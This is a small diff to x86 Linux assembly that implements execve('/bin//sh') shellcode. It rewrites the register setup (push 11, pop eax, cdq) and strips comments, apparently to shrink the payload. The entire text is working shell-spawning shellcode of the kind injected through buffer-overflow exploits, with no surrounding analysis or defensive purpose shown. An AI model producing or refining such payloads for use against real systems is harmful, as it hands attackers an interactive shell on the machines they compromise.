@@ -1,13 +1,14 @@
         .intel_syntax noprefix
         .globl _start
 _start:
-        xor edx, edx
+        push 11
+        pop eax
+        cdq
         push edx
         push 0x68732f2f
-        push 0x6e69622f    /* "/bin//sh" */
+        push 0x6e69622f
         mov ebx, esp
         push edx
         push ebx
         mov ecx, esp
-        lea eax, [edx+11]  /* execve */
         int 0x80
